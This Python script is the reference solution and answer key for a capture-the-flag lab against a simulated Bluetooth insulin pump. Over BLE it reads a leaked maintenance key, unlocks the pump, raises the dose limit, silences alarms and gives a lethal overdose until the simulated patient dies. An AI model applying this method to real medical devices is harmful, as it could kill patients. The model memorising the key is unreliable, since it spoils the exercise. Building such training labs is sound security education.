#!/usr/bin/env python3
"""
Self-test / reference solution for MedSim IP-800.

Runs the WHOLE attack chain against a real device using `bleak` as the BLE
central. Use it to (a) verify the pump works before class, and (b) as the
facilitator's answer key. Run it preferably from a DIFFERENT machine than the
Pi, or from the Pi with a second BLE adapter.

    pip install bleak
    python3 attack_client.py                 # find the device by name
    python3 attack_client.py --address AA:BB:CC:DD:EE:FF
    python3 attack_client.py --name "team-test" --scenario bolus

Scenarios: full (basal overdose, default), bolus (fast bolus kill),
           recon (recon only, does not kill).
"""

import argparse
import asyncio
import struct
import sys

from bleak import BleakScanner, BleakClient

DEVICE_NAME = "MedSim IP-800"

def u16(short): return f"0000{short:04x}-0000-1000-8000-00805f9b34fb"
CHAR_MODEL      = u16(0x2A24)
CHAR_FIRMWARE   = u16(0x2A26)
CHAR_FEATURES   = u16(0x2B23)
CHAR_STATUS     = u16(0x2B22)
CHAR_CCP        = u16(0x2B25)

def ctf(n): return f"4d454453-494d-4d00-0000-{n:012x}"
CHAR_PLAYER = ctf(2)
CHAR_FLAG   = ctf(3)
CHAR_SUBMIT = ctf(4)
CHAR_SCORE  = ctf(5)

OP_SET_BASAL, OP_SET_BOLUS, OP_SET_MAX = 0x01, 0x02, 0x03
OP_UNLOCK, OP_SILENCE, OP_STOP = 0x04, 0x05, 0x06


def centi(x): return struct.pack("<H", int(round(x * 100)))


async def find(address, name):
    if address:
        return address
    print(f"[*] Scanning for '{name}'…")
    dev = await BleakScanner.find_device_by_name(name, timeout=15)
    if not dev:
        print(f"[!] No device found with name '{name}'.")
        sys.exit(1)
    print(f"[+] Found {dev.address}")
    return dev.address


def parse_status(data):
    if len(data) < 9:
        return {}
    flags, basal, maxlim, res, glu = struct.unpack_from("<BHHHH", data, 0)
    return dict(therapy=bool(flags & 1), unlocked=bool(flags & 2),
                silenced=bool(flags & 4), occlusion=bool(flags & 8),
                deceased=bool(flags & 16),
                basal=basal/100, maxlimit=maxlim/100,
                reservoir=res, glucose=glu/100)


async def run(args):
    address = await find(args.address, args.name_dev)
    async with BleakClient(address) as c:
        print(f"[+] Connected to {address}\n")

        # --- identity ---
        await c.write_gatt_char(CHAR_PLAYER, args.name.encode(), response=True)
        print(f"[player] set name: {args.name}")

        # --- F1 recon ---
        model = (await c.read_gatt_char(CHAR_MODEL)).decode(errors="replace")
        fw = (await c.read_gatt_char(CHAR_FIRMWARE)).decode(errors="replace")
        print(f"[recon] Model: {model}")
        print(f"[recon] Firmware: {fw}")
        # extract the maint key from the firmware string
        key_hex = fw.split("maint-key:")[-1].strip(") ")[:8]
        print(f"[recon] found maint key: {key_hex}")

        # --- F2 features ---
        feat = await c.read_gatt_char(CHAR_FEATURES)
        f, fmax, ceil = struct.unpack_from("<BHH", feat, 0)
        print(f"[recon] features=0x{f:02x} factory_max={fmax/100} ceiling={ceil/100}")

        st = parse_status(await c.read_gatt_char(CHAR_STATUS))
        print(f"[status] {st}\n")

        if args.scenario == "recon":
            await show_flags(c)
            return

        # --- F3 legal basal rate ---
        await c.write_gatt_char(CHAR_CCP, bytes([OP_SET_BASAL]) + centi(2.0), response=True)
        print("[cmd] set legal basal 2.0 U/h  (F3)")

        # --- F4 hit the interlock ---
        await c.write_gatt_char(CHAR_CCP, bytes([OP_SET_BASAL]) + centi(15.0), response=True)
        print("[cmd] tried basal 15.0 -> clamped (F4)")

        # --- F5 unlock ---
        await c.write_gatt_char(CHAR_CCP, bytes([OP_UNLOCK]) + bytes.fromhex(key_hex), response=True)
        print(f"[cmd] Maintenance Unlock with {key_hex} (F5)")

        # --- F6 raise the limit ---
        await c.write_gatt_char(CHAR_CCP, bytes([OP_SET_MAX]) + centi(20.0), response=True)
        print("[cmd] raised max basal limit -> 20 U/h (F6)")

        if args.silence:
            await c.write_gatt_char(CHAR_CCP, bytes([OP_SILENCE, 1]), response=True)
            print("[cmd] silenced the alarms (for F8 stealth kill)")

        # --- F7 (+F8/F9) kill ---
        if args.scenario == "bolus":
            await c.write_gatt_char(CHAR_CCP, bytes([OP_SET_BOLUS]) + centi(40.0), response=True)
            print("[cmd] gave overdose bolus 40 U (F7 + F9)")
        else:
            await c.write_gatt_char(CHAR_CCP, bytes([OP_SET_BASAL]) + centi(12.0), response=True)
            print("[cmd] set basal 12 U/h -> lethal (F7)")

        # --- wait for death ---
        print("\n[*] Waiting for the patient's state…")
        for _ in range(120):
            st = parse_status(await c.read_gatt_char(CHAR_STATUS))
            print(f"    G={st.get('glucose'):.2f} basal={st.get('basal')} "
                  f"deceased={st.get('deceased')}")
            if st.get("deceased"):
                print("[OK] THE PATIENT DIED - attack succeeded.\n")
                break
            await asyncio.sleep(2)

        await show_flags(c)


async def show_flags(c):
    flags = (await c.read_gatt_char(CHAR_FLAG)).decode(errors="replace")
    print("\n[flags] earned:")
    print("    " + flags.replace("\n", "\n    "))
    # submit the first flag as a demonstration
    first = flags.strip().splitlines()[0] if flags.strip() else ""
    if first and " " in first:
        fstr = first.split()[-1]
        await c.write_gatt_char(CHAR_SUBMIT, fstr.encode(), response=True)
        res = (await c.read_gatt_char(CHAR_SUBMIT)).decode(errors="replace")
        print(f"[submit] submitted {fstr}: {res}")
    score = (await c.read_gatt_char(CHAR_SCORE)).decode(errors="replace")
    print(f"[score] {score}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--address", help="BLE address (otherwise scan by name)")
    ap.add_argument("--name-dev", default=DEVICE_NAME, help="Device advertising name")
    ap.add_argument("--name", default="selftest", help="Your Player Name")
    ap.add_argument("--scenario", choices=["full", "bolus", "recon"], default="full")
    ap.add_argument("--silence", action="store_true", help="Silence alarms (F8)")
    asyncio.run(run(ap.parse_args()))


if __name__ == "__main__":
    main()
